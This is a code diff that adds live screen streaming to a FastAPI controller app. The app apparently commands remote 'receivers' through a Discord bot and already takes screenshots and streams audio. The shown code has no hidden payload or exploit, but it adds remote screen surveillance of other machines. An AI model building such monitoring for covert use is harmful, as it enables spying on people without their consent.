@@ -131,6 +131,8 @@ def _receiver_status(info: dict, now: Optional[float] = None) -> tuple[str, str,
     mode = (info.get("mode") or "").lower()
     if mode in ("gif", "gif_display"):
         return ("Gif Display", "gif", True)
+    if mode in ("live", "live_view", "stream"):
+        return ("Live View", "live", True)
     return ("Online", "online", True)
 
 def _set_receiver_mode(rid: Optional[str], mode: str):
@@ -292,6 +294,34 @@ class Hub:
 
 hub = Hub()
 
+class LiveHub:
+    def __init__(self):
+        self.viewers: set[WebSocket] = set()
+        self.lock = asyncio.Lock()
+        self.latest: Optional[bytes] = None
+
+    async def add_viewer(self, ws: WebSocket):
+        async with self.lock:
+            self.viewers.add(ws)
+
+    async def remove_viewer(self, ws: WebSocket):
+        async with self.lock:
+            self.viewers.discard(ws)
+
+    async def broadcast(self, data: bytes):
+        self.latest = data
+        dead = []
+        async with self.lock:
+            for ws in list(self.viewers):
+                try:
+                    await ws.send_bytes(data)
+                except Exception:
+                    dead.append(ws)
+            for ws in dead:
+                self.viewers.discard(ws)
+
+_live_hubs: dict[str, LiveHub] = {}
+
 # ---------------- FASTAPI ----------------
 app = FastAPI(title="Controller")
 SCREENSHOT_DIR.mkdir(parents=True, exist_ok=True)
@@ -335,6 +365,7 @@ CONTROL_HTML = """<!doctype html>
     .status-online { border-color: rgba(34,197,94,0.5); color: #86efac; background: rgba(34,197,94,0.12); }
     .status-offline { border-color: rgba(239,68,68,0.45); color: #fecaca; background: rgba(239,68,68,0.12); }
     .status-gif { border-color: rgba(251,146,60,0.45); color: #fdba74; background: rgba(251,146,60,0.12); }
+    .status-live { border-color: rgba(56,189,248,0.45); color: #7dd3fc; background: rgba(56,189,248,0.12); }
     .receiver-actions { display: flex; gap: 8px; flex-wrap: wrap; justify-content: flex-end; }
     .receiver-actions form { margin: 0; }
     .receiver-id { opacity: 0.8; }
@@ -347,6 +378,9 @@ CONTROL_HTML = """<!doctype html>
     .shot-thumb { width: 72px; height: 54px; object-fit: cover; border-radius: 8px; border: 1px solid var(--border); }
     .shot-time { font-size: 12px; color: var(--muted); }
     .shot-full { margin-top: 10px; width: 100%; border-radius: 10px; border: 1px solid var(--border); }
+    .live-wrap { margin-top: 12px; padding: 10px; border: 1px solid var(--border); border-radius: 12px; background: #0b0716; }
+    .live-img { width: 100%; display: block; border-radius: 10px; border: 1px solid var(--border); background: #05030b; }
+    .live-status { margin-left: auto; }
     .rename-section { margin-top: 16px; padding: 12px; border: 1px solid var(--border); border-radius: 12px; background: #0c0817; }
     .rename-section h2 { margin: 0 0 10px; font-size: 14px; letter-spacing: 0.3px; }
     .rename-grid { display: grid; grid-template-columns: minmax(160px, 1fr) minmax(200px, 2fr) auto; gap: 10px; align-items: center; }
@@ -426,6 +460,18 @@ CONTROL_HTML = """<!doctype html>
         <p style="color:var(--muted); margin-bottom:12px;">
           Capture a screenshot on the selected receiver and keep a log here.
         </p>
+        <div class="row">
+          <form method="post" action="/ui/live/start">
+            <button type="submit">Start Live</button>
+          </form>
+          <form method="post" action="/ui/live/stop">
+            <button type="submit" class="secondary">Stop Live</button>
+          </form>
+          <span id="live-status" class="pill live-status">Live: off</span>
+        </div>
+        <div class="live-wrap">
+          <img id="live-img" class="live-img" alt="Live view">
+        </div>
         <div class="row">
           <form method="post" action="/ui/screenshot">
             <button type="submit">Take Screenshot</button>
@@ -537,6 +583,11 @@ CONTROL_HTML = """<!doctype html>
       if (pinInput) pinInput.focus();
     });
     let selectedReceiver = null;
+    let liveSocket = null;
+    let liveWanted = false;
+    let liveTarget = null;
+    const liveImg = document.getElementById('live-img');
+    const liveStatus = document.getElementById('live-status');
     let lastReceiverList = [];
     const renameForm = document.getElementById('rename-form');
     const renameSelect = document.getElementById('rename-target');
@@ -567,6 +618,64 @@ CONTROL_HTML = """<!doctype html>
         const rec = lastReceiverList.find(item => item.id === rid);
         updateRenameSection(rec);
       });
+    }
+
+    function setLiveStatus(text) {
+      if (liveStatus) liveStatus.textContent = text;
+    }
+
+    function buildLiveUrl(rid) {
+      const scheme = location.protocol === 'https:' ? 'wss' : 'ws';
+      return `${scheme}://${location.host}/live/${encodeURIComponent(rid)}?role=viewer`;
+    }
+
+    function startLiveView() {
+      liveWanted = true;
+      if (!selectedReceiver) {
+        setLiveStatus('Live: select receiver');
+        return;
+      }
+      const url = buildLiveUrl(selectedReceiver);
+      if (liveSocket && liveSocket.readyState <= 1 && liveTarget === url) {
+        return;
+      }
+      stopLiveView(false);
+      liveTarget = url;
+      liveSocket = new WebSocket(url);
+      liveSocket.binaryType = 'arraybuffer';
+      setLiveStatus('Live: connecting');
+      liveSocket.onopen = () => setLiveStatus('Live: connected');
+      liveSocket.onerror = () => setLiveStatus('Live: error');
+      liveSocket.onclose = () => {
+        setLiveStatus(liveWanted ? 'Live: disconnected' : 'Live: off');
+      };
+      liveSocket.onmessage = (event) => {
+        if (!liveImg) return;
+        const blob = new Blob([event.data], { type: 'image/jpeg' });
+        const obj = URL.createObjectURL(blob);
+        if (liveImg.dataset.lastUrl) {
+          URL.revokeObjectURL(liveImg.dataset.lastUrl);
+        }
+        liveImg.dataset.lastUrl = obj;
+        liveImg.src = obj;
+      };
+    }
+
+    function stopLiveView(setOff = true) {
+      if (setOff) liveWanted = false;
+      if (liveSocket) {
+        try { liveSocket.close(); } catch (e) { /* ignore */ }
+      }
+      liveSocket = null;
+      liveTarget = null;
+      if (liveImg) {
+        if (liveImg.dataset.lastUrl) {
+          URL.revokeObjectURL(liveImg.dataset.lastUrl);
+          delete liveImg.dataset.lastUrl;
+        }
+        liveImg.removeAttribute('src');
+      }
+      if (setOff) setLiveStatus('Live: off');
     }
     async function refreshReceivers() {
       try {
@@ -676,6 +785,9 @@ CONTROL_HTML = """<!doctype html>
         if (panicBtn) {
           panicBtn.disabled = !selectedReceiver;
         }
+        if (liveWanted) {
+          startLiveView();
+        }
       } catch (e) { /* ignore */ }
     }
     async function refreshScreenshots() {
@@ -780,6 +892,12 @@ CONTROL_HTML = """<!doctype html>
         if (form.action.includes('/ui/screenshot')) {
           setTimeout(refreshScreenshots, 2000);
         }
+        if (form.action.includes('/ui/live/start')) {
+          startLiveView();
+        }
+        if (form.action.includes('/ui/live/stop')) {
+          stopLiveView();
+        }
       });
     }
     // tabs
@@ -853,6 +971,33 @@ async def audio_ws(ws: WebSocket):
         await hub.remove(ws)
 
 
+# ---------------- LIVE VIEW ----------------
+@app.websocket("/live/{rid}")
+async def live_ws(ws: WebSocket, rid: str, role: str = "viewer"):
+    await ws.accept()
+    hub = _live_hubs.setdefault(rid, LiveHub())
+    if role == "sender":
+        try:
+            while True:
+                data = await ws.receive_bytes()
+                await hub.broadcast(data)
+        except WebSocketDisconnect:
+            pass
+        return
+    await hub.add_viewer(ws)
+    if hub.latest:
+        try:
+            await ws.send_bytes(hub.latest)
+        except Exception:
+            pass
+    try:
+        while True:
+            await ws.receive()
+    except WebSocketDisconnect:
+        pass
+    finally:
+        await hub.remove_viewer(ws)
+
 # ---------------- COMMAND ENDPOINTS ----------------
 async def _send_cmd(msg: str):
     await _controller_ready.wait()
@@ -909,6 +1054,12 @@ def _cmd_for_receiver(rid: Optional[str], cmd: str, *args: str) -> str:
     if rid:
         return f"TARGET {rid} {base}"
     return f"TARGET NONE {base}"
+
+def _build_live_ws_url(request: Request, rid: str) -> str:
+    scheme = request.headers.get("x-forwarded-proto") or request.url.scheme
+    ws_scheme = "wss" if scheme == "https" else "ws"
+    host = request.headers.get("x-forwarded-host") or request.headers.get("host") or request.url.netloc
+    return f"{ws_scheme}://{host}/live/{rid}?role=sender"
 
 async def _read_form_value(request: Request, name: str) -> Optional[str]:
     try:
@@ -1081,6 +1232,27 @@ async def ui_screenshot():
     if not await _wait_controller_ready():
         return HTMLResponse("Discord bot not ready", status_code=503)
     await _send_cmd(_cmd_with_selection("SCREENSHOT"))
+    return RedirectResponse(url="/", status_code=303)
+
+@app.post("/ui/live/start")
+async def ui_live_start(request: Request):
+    if not _selected_receiver:
+        return HTMLResponse("No receiver selected", status_code=400)
+    if not await _wait_controller_ready():
+        return HTMLResponse("Discord bot not ready", status_code=503)
+    ws_url = _build_live_ws_url(request, _selected_receiver)
+    await _send_cmd(_cmd_with_selection("LIVE_START", ws_url))
+    _set_receiver_mode(_selected_receiver, "live")
+    return RedirectResponse(url="/", status_code=303)
+
+@app.post("/ui/live/stop")
+async def ui_live_stop():
+    if not _selected_receiver:
+        return HTMLResponse("No receiver selected", status_code=400)
+    if not await _wait_controller_ready():
+        return HTMLResponse("Discord bot not ready", status_code=503)
+    await _send_cmd(_cmd_with_selection("LIVE_STOP"))
+    _set_receiver_mode(_selected_receiver, "")
     return RedirectResponse(url="/", status_code=303)
 
 @app.post("/ui/rename/{rid}")
